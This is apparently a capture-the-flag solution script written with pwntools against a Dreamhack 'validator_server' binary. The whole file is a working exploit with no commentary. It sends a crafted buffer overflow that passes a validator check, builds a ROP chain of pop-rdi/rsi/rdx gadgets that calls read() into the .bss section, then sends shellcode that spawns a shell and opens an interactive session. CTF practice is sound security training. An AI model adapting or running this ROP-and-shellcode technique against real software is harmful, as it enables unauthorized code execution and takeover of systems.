#!/usr/bin/env python3

from pwn import *

exe = ELF("./validator_server")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 8262)

    return r


def main():
    r = conn()

    rop = ROP(exe)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "ret"])[0]
    shellcode_addr = exe.bss() + 0x15

    payload = b"DREAMHACK!\x00"
    for i in range(118, 0, -1):
        payload += p8(i)
    payload += b"A" * 7                                 # SFP
    payload += p64(rdi_gadget)                          
    payload += p64(0)                                   # stdin
    payload += p64(rsi_gadget)
    payload += p64(shellcode_addr)
    payload += p64(0)
    payload += p64(rdx_gadget)                  
    payload += p64(0x800)
    payload += p64(exe.plt["read"])
    payload += p64(shellcode_addr)
    
    r.send(payload)

    payload2 = asm(shellcraft.sh())

    sleep(0.5)
    r.send(payload2)

    r.interactive()


if __name__ == "__main__":
    main()